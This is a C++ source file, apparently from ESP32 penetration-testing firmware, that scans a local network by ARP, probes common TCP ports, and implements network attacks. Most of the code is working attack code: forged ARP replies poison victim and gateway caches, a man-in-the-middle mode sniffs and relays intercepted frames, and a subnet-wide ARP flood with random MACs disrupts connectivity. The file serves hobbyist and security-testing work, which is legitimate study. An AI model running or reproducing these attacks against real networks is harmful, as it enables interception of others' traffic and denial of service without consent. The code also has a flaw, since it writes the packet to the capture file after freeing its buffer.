#include "core/globals.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#include "core/wifi_common.h"
#include "scan_hosts.h"
#include "clients.h"

//thx to 7h30th3r0n3, which made scanHosts faster using ARP

static std::vector<Host> hostslist;

// TODO: resolve clients name when in host mode through dhcp

// TODO: move to a config
TickType_t arpRequestDelay = 20u / portTICK_PERIOD_MS; // can be relatively low, helps to not overwhelm the stream

void readArpTable(netif * iface) {
  for( uint32_t i = 0; i < ARP_TABLE_SIZE; ++i ){
    ip4_addr_t* ip_ret;
    eth_addr* eth_ret;
    if( etharp_get_entry(i, &ip_ret, &iface, &eth_ret) ){
      hostslist.emplace_back(ip_ret, eth_ret);
    }
  }
  etharp_cleanup_netif(iface);
}

void local_scan_setup() {
    bool doScan = true;
    if(!wifiConnected) doScan=wifiConnectMenu();

    if (doScan) {
        hostslist.clear();

        // IPAddress uint32_t op returns number in big-endian
        // for simplicity of iteration and arithmetics convert to little-endian
        const uint32_t localIp = ntohl(WiFi.localIP());
        const IPAddress gateway = WiFi.gatewayIP();
        const uint32_t subnetMask = ntohl(WiFi.subnetMask());
        const uint32_t networkAddress = ntohl(gateway) & subnetMask;
        const uint32_t broadcast = networkAddress | ~subnetMask;

        // get iface
        void * netif = nullptr;
        tcpip_adapter_get_netif(TCPIP_ADAPTER_IF_STA, &netif);
        struct netif *net_iface = (struct netif *)netif;
        etharp_cleanup_netif(net_iface); // to avoid gateway duplication

        displaySomething("Probing " + String(broadcast - networkAddress - 1) + " hosts"); // minus broadcast and subnet mask

        // send arp requests, read table each ARP_TABLE_SIZE requests
        uint16_t tableReadCounter = 0;
        for( uint32_t ip_le = networkAddress + 1; ip_le < broadcast; ++ip_le ){
          if( ip_le == localIp ) continue;

          ip4_addr_t ip_be{htonl(ip_le)}; // big endian
          err_t res = etharp_request(net_iface, &ip_be);

          if( res != ERR_OK ){
            Serial.println("Arp req for: " + IPAddress(ip_be.addr).toString() + "failed with ec: " + res);
          } else {
            ++tableReadCounter;
          }

          vTaskDelay(arpRequestDelay);

          // read table if we sent ARP_TABLE_SIZE requests
          if( tableReadCounter == ARP_TABLE_SIZE ){
            readArpTable(net_iface);
            tableReadCounter = 0;
          }
        }

        ScanHostMenu:
        if (hostslist.empty()) {
            tft.println("No hosts found");
            delay(2000);
            return;
        }

        options = {};
        for(auto host:hostslist) {
          String result = host.ip.toString();
          if( host.ip == gateway ) result += "(GTW)";
          options.push_back({result.c_str(), [=](){ afterScanOptions(host); }});
        }
        options.push_back({"Main Menu", [=]() { backToMenu(); }});

        delay(200);
        loopOptions(options);
        delay(200);
        if(!returnToMenu) goto ScanHostMenu;
    }
    hostslist.clear();
}

void afterScanOptions(const Host& host) {
  int opt=0;
  options = {
    {"Host info",       [=](){ hostInfo(host); }},
  #ifndef LITE_VERSION
    {"SSH Connect",     [=](){ ssh_setup(host.ip.toString()); }},
  #endif
    {"ARP Poisoning",   [=](){ arpPoisoner(); }},
    {"ARP Spoofing",    [=](){ arpSpoofing(host, false); }},
  };
  if(sdcardMounted && bruceConfig.devMode) options.push_back(
  //options.push_back(
    {"ARP MITM (WIP)",  [&](){ opt=5;  }}
    );
  loopOptions(options);
  delay(200);
  if(opt==5)  { 
    Serial.println("Starting MITM");
    arpSpoofing(host, true);
  }
}

void hostInfo(const Host& host) {
  WiFiClient client;
  const int ports[] = {20, 21, 22, 23, 25, 80, 137, 139, 443, 3389, 8080, 8443, 9090};
  const int numPorts = sizeof(ports) / sizeof(ports[0]);
  drawMainBorder();
  tft.setTextSize(FP);
  tft.setCursor(8,30);

  tft.print("Host: " + host.ip.toString());
  tft.setCursor(8,42);

  tft.print("Mac: " + host.mac);
  tft.setCursor(8,54);

  tft.print("Manufacturer: " + getManufacturer(host.mac));
  tft.setCursor(8,66);

  tft.print("Ports Opened: ");
  for (int i = 0; i < numPorts; i++) {
    int port = ports[i];

    // TODO: print the ports being scanned
    // right now there is no idea to understand which ports are being scanned
    // without looking at the code
    if (client.connect(host.ip, port)) {
      if (tft.getCursorX()>(240-LW*4)) tft.setCursor(7,tft.getCursorY() + LH);
      tft.print(port);
      tft.print(", ");
      client.stop();
    } else tft.print(".");
  }
  tft.setCursor(8,tft.getCursorY()+16);
  tft.print("Done!");

  while(checkSelPress()) yield();
  while(!checkSelPress()) yield();
}




// ARP Poisoning and MITM POC first step (ARPSpoofing, not saving and forwarding packets)
#include <modules/wifi/sniffer.h> //use PCAP file saving functions
#include <esp_wifi.h>
#include <lwip/sockets.h>
#include <lwip/dns.h>
#include <lwip/inet.h>
#include <lwip/igmp.h>
#include <lwip/netif.h>
#include <lwip/err.h>
#include <lwip/sys.h>
#include <lwip/timeouts.h>
#include <lwip/init.h>
#include <lwip/mem.h>
#include <lwip/memp.h>
#include <lwip/ip_addr.h>
#include <lwip/etharp.h>
#include <iostream>
#include <sstream>
#include <iomanip>


// Função para converter IP para string
String ipToString(const uint8_t* ip) {
  return String(ip[0]) + "." + String(ip[1]) + "." + String(ip[2]) + "." + String(ip[3]);
}

// Função para converter MAC para string
String macToString(const uint8_t* mac) {
  char buf[18];
  sprintf(buf, "%02X:%02X:%02X:%02X:%02X:%02X", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
  return String(buf);
}

void stringToMAC(const std::string& macStr, uint8_t MAC[6]) {
    std::stringstream ss(macStr);
    unsigned int temp;
    for (int i = 0; i < 6; ++i) {
        char delimiter;
        ss >> std::hex >> temp;
        MAC[i] = static_cast<uint8_t>(temp); 
        ss >> delimiter; 
    }
}

// Função para obter o MAC do gateway
void getGatewayMAC(uint8_t gatewayMAC[6]) {
  wifi_ap_record_t ap_info;
  if (esp_wifi_sta_get_ap_info(&ap_info) == ESP_OK) {
    memcpy(gatewayMAC, ap_info.bssid, 6);
    Serial.print("Gateway MAC: ");
    Serial.println(macToString(gatewayMAC));
  } else {
    Serial.println("Erro ao obter informações do AP.");
  }
}

// Function provided by @Fl1p, thank you brother!
// Função para enviar pacotes ARP falsificados
void sendARPPacket(uint8_t *targetIP, uint8_t *targetMAC, uint8_t *spoofedIP, uint8_t *spoofedMAC, File pcapFile) {
  struct eth_hdr *ethhdr;
  struct etharp_hdr *arphdr;
  struct pbuf *p;
  struct netif *netif;


  // Obter interface de rede
  netif = netif_list;
  if (netif == NULL) {
    Serial.println("Nenhuma interface de rede encontrada!");
    return;
  }

  // Alocar pbuf para o pacote ARP
  p = pbuf_alloc(PBUF_RAW, sizeof(struct eth_hdr) + sizeof(struct etharp_hdr), PBUF_RAM);
  if (p == NULL) {
    Serial.println("Falha ao alocar pbuf!");
    return;
  }

  ethhdr = (struct eth_hdr *)p->payload;
  arphdr = (struct etharp_hdr *)((u8_t *)p->payload + SIZEOF_ETH_HDR);

  // Preencher cabeçalho Ethernet
  MEMCPY(&ethhdr->dest, targetMAC, ETH_HWADDR_LEN);  // MAC do alvo (vítima ou gateway)
  MEMCPY(&ethhdr->src, spoofedMAC, ETH_HWADDR_LEN);       // MAC do atacante (nosso)
  ethhdr->type = PP_HTONS(ETHTYPE_ARP);

  // Preencher cabeçalho ARP
  arphdr->hwtype = PP_HTONS(1); // 1 é o código para Ethernet no campo hardware type (hwtype)
  arphdr->proto = PP_HTONS(ETHTYPE_IP);
  arphdr->hwlen = ETH_HWADDR_LEN;
  arphdr->protolen = sizeof(ip4_addr_t);
  arphdr->opcode = PP_HTONS(ARP_REPLY);

  MEMCPY(&arphdr->shwaddr, spoofedMAC, ETH_HWADDR_LEN);  // MAC falsificado (gateway ou vítima)
  MEMCPY(&arphdr->sipaddr, spoofedIP, sizeof(ip4_addr_t)); // IP falsificado (gateway ou vítima)
  MEMCPY(&arphdr->dhwaddr, targetMAC, ETH_HWADDR_LEN);    // MAC real do alvo (vítima ou gateway)
  MEMCPY(&arphdr->dipaddr, targetIP, sizeof(ip4_addr_t)); // IP real do alvo (vítima ou gateway)

  // Enviar o pacote
  netif->linkoutput(netif, p);
  pbuf_free(p);
  Serial.println("Pacote ARP enviado!");

  // Capturar o pacote no arquivo PCAP
  if (pcapFile) {
    pcapFile.write((const uint8_t *)p->payload, p->tot_len); // don't know if it will work
    pcapFile.flush();
  }

}


// Converts from IP String to byte array
bool parseIPString(const String &ipStr, uint8_t *ipArray) {
  int parts[4] = {0};
  int count = sscanf(ipStr.c_str(), "%d.%d.%d.%d", &parts[0], &parts[1], &parts[2], &parts[3]);
  if (count == 4) {
    for (int i = 0; i < 4; i++) {
      ipArray[i] = (uint8_t)parts[i];
    }
    return true;
  }
  return false;
}

// gateway and clients MAC for callback
uint8_t gatewayMAC[6] = {0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF}; 
uint8_t victimMAC[6] = {0x11, 0x22, 0x33, 0x44, 0x55, 0x66}; 
uint8_t myMAC[6];  // MAC do ESP32
File pcapFile;

unsigned long crc32iso_hdlc(unsigned long crc, uint8_t const *mem, size_t len) {
    unsigned char const *data = mem;
    if (data == NULL)
        return 0;
    crc ^= 0xffffffff;
    while (len--) {
        crc ^= *data++;
        for (unsigned k = 0; k < 8; k++)
            crc = crc & 1 ? (crc >> 1) ^ 0xedb88320 : crc >> 1;
    }
    return crc ^ 0xffffffff;
}

// Callback para processar pacotes no modo Promiscuous
void mitmCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (type != WIFI_PKT_MGMT && type != WIFI_PKT_DATA) {
      return; // Processa apenas pacotes de gerenciamento e dados
  }

  wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*) buf;
  wifi_pkt_rx_ctrl_t ctrl = (wifi_pkt_rx_ctrl_t)pkt->rx_ctrl;
  // preamble (8 bytes) + destMAC(6 bytes) + srcMAC(6 bytes)
  uint8_t* destMAC = pkt->payload + 4 ;
  uint8_t* srcMAC = pkt->payload + 10;

  
  // Verifica se o pacote é destinado ao ESP32
  if (memcmp(destMAC, myMAC, 6) == 0 || memcmp(srcMAC, myMAC, 6) == 0) {
    //for(int i=4; i<16; i++) {
    //  Serial.print(pkt->payload[i],HEX); 
    //  Serial.print(" ");
    //}
    //Serial.print(" - destMAC ");
    //for(int i=0; i<6; i++) { Serial.print(destMAC[i],HEX); Serial.print(" "); }
    //Serial.print(" - My MAC ");
    //for(int i=0; i<6; i++) { Serial.print(myMAC[i],HEX); Serial.print(" "); }
    //Serial.println();

    //Serial.print(" - srcMAC ");
    //for(int i=0; i<6; i++) { Serial.print(srcMAC[i],HEX); Serial.print(" "); }
    //Serial.print(" - GTW MAC ");
    //for(int i=0; i<6; i++) { Serial.print(gatewayMAC[i],HEX); Serial.print(" "); }
    //Serial.print(" - clientMAC MAC ");
    //for(int i=0; i<6; i++) { Serial.print(victimMAC[i],HEX); Serial.print(" "); }
    //Serial.println();

    uint32_t timestamp = now(); // current timestamp
    uint32_t microseconds = (unsigned int)(micros() - millis() * 1000); // microseconds offset (0 - 999)
    uint32_t len = ctrl.sig_len;

    for(int i = 0; i<len;i++) { Serial.print(pkt->payload[i],HEX); Serial.print(" "); }
    Serial.print("->");
    unsigned long crc=0;
    crc=crc32iso_hdlc(crc,pkt->payload,len);
    Serial.println(crc,HEX);

    if(type == WIFI_PKT_MGMT) {
      len -= 4; // Need to remove last 4 bytes (for checksum) or packet gets malformed # https://github.com/espressif/esp-idf/issues/886
    }
    //newPacketSD(timestamp, microseconds, len, pkt->payload, pcapFile); // If it is to save everything, saves every packet
    Serial.print("packet->");
    // Encaminha para o cliente se veio do gateway
    if (memcmp(srcMAC, gatewayMAC, 6) == 0) {
      memcpy(destMAC, victimMAC, 6); // Ajusta MAC de destino
      //What happens with checkSUM???
      Serial.println("Client");
      esp_wifi_80211_tx(WIFI_IF_STA, pkt->payload, pkt->rx_ctrl.sig_len, true);
    }
    // Encaminha para o gateway se veio do cliente
    else if (memcmp(srcMAC, victimMAC, 6) == 0) {
      memcpy(destMAC, gatewayMAC, 6); // Ajusta MAC de destino
      //What happens with checkSUM???
      Serial.println("Gtw");
      esp_wifi_80211_tx(WIFI_IF_STA, pkt->payload, pkt->rx_ctrl.sig_len, true);
    }
  }
}

void arpSpoofing(const Host& host, bool mitm) {

  uint8_t gatewayIP[4];
  uint8_t victimIP[4]; // Endereço IP da vítima  

  static int nf=0;
  FS *fs;
  if(setupSdCard()) fs=&SD;
  else { 
    fs=&LittleFS;
    mitm=false;   //LittleFs doesn have room and processing to run this attack;
  }
  if(!fs->exists("/BrucePCAP")) fs->mkdir("/BrucePCAP");
  while(fs->exists(String("/BrucePCAP/ARP_session_" + String(nf++) + ".pcap").c_str())) yield();
  pcapFile = fs->open(String("/BrucePCAP/ARP_session_" + String(nf) + ".pcap").c_str(), FILE_WRITE);
  
  writeHeader(pcapFile); // write pcap header into the file

  // Get the MAC from the attacker (bruce MAC)
  esp_read_mac(myMAC, ESP_MAC_WIFI_STA);
  for(int i=0; i<4; i++) victimIP[i] = host.ip[i];
  stringToMAC(host.mac.c_str(),victimMAC);
  getGatewayMAC(gatewayMAC);
  IPAddress gatewayIp = WiFi.gatewayIP();
  for(int i=0; i<4; i++) gatewayIP[i] = gatewayIp[i];

  drawMainBorderWithTitle("ARP Spoofing");
  padprintln("");

  if(mitm) {
    tft.setTextSize(FP);
    padprintln("Man in The middle Activated");
    padprintln("/BrucePCAP/ARP_session_" + String(nf) + ".pcap");
    // Setup promiscuous mode
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(mitmCallback);

    Serial.println("Promiscuous Mode ACTIVATED, reading data to/BrucePCAP/ARP_session_" + String(nf) + ".pcap");
  }
  padprintln("Tgt:" + host.mac);
  padprintln("GTW:" + macToString(gatewayMAC));
  padprintln("");
  padprintln("Press Any key to STOP.");


  long tmp=0;
  while(!checkAnyKeyPress()) {
    if(tmp+2000<millis()){  // sends frames every 5 seconds
      // Enviar resposta ARP falsificada para a vítima (associando o IP do gateway ao MAC do atacante)
      sendARPPacket(victimIP, victimMAC, gatewayIP, myMAC, pcapFile);
                
      // Enviar resposta ARP falsificada para o gateway (associando o IP da vítima ao MAC do atacante)
      sendARPPacket(gatewayIP, gatewayMAC, victimIP, myMAC, pcapFile);
      tmp=millis();
    }
  }
  
  if(mitm) {
    // Configura o modo Promiscuous
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(nullptr);

    Serial.println("Promiscuous mode deactivated.");
  }

  // Restore ARP Table
  sendARPPacket(victimIP, victimMAC, gatewayIP, gatewayMAC, pcapFile);
  sendARPPacket(gatewayIP, gatewayMAC, victimIP, victimMAC, pcapFile);

  pcapFile.flush();
  pcapFile.close();

}

void arpPoisoner() {
  
  uint8_t gatewayIP[4];
  uint8_t victimIP[4]; // Endereço IP da vítima
  uint8_t gatewayMAC[6];  // MAC do Gateway
  uint8_t victimMAC[6];  // MAC da vítima

  for (int i = 0; i < 6; i++){
    gatewayMAC[i] = random(256);
    victimMAC[i] = random(256);
  }
  IPAddress ip = WiFi.gatewayIP();
  for(int i=0; i<4;i++) {
    gatewayIP[i]=ip[i];
    victimIP[i]=ip[i];
  }
  long tmp=0;
    drawMainBorderWithTitle("ARP Poisoning");
  padprintln("");

  padprintln("Press Any key to STOP.");


  while(!checkAnyKeyPress()) {
    if(tmp+2000<millis()){  // sends frames every 5 seconds
      for(int i=1;i<255;i++) {
        victimIP[3]=i;
        // Sends random Gateway MAC to all devices in the network
        sendARPPacket(victimIP, victimMAC, gatewayIP, gatewayMAC, pcapFile);
           
        // Sends Device random MACs back to gateway
        sendARPPacket(gatewayIP, gatewayMAC, victimIP, victimMAC, pcapFile);

        delay(1); 
      }
      tmp=millis();
    }
  }
}